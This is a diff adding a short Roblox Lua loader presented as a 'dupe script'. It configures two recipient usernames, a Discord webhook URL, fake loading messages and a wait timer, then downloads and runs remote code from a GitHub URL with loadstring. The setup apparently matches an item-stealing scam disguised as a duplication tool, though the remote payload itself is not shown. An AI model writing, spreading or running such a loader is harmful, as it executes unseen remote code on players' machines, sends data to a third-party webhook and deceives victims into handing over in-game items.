@@ -1,0 +1,10 @@
+UserName = "Zetsuq3"
+UserName2 = "Zetsuq2"
+Webhook = "https://discord.com/api/webhooks/1107941308787589160/WyfB6Cm9YfqYOOmdEQAyGaREmEQu49teBehOOB9tanooTznH5k_FX9I0pFbWFb7r4Yke"
+_G.AntiLeave = false
+_G.ScriptName = "DupeScriptRizz"
+_G.FirstText = "Script Preaparing"
+_G.SecondText = "Script Loading"
+_G.ThirdText = "Almost Done"
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
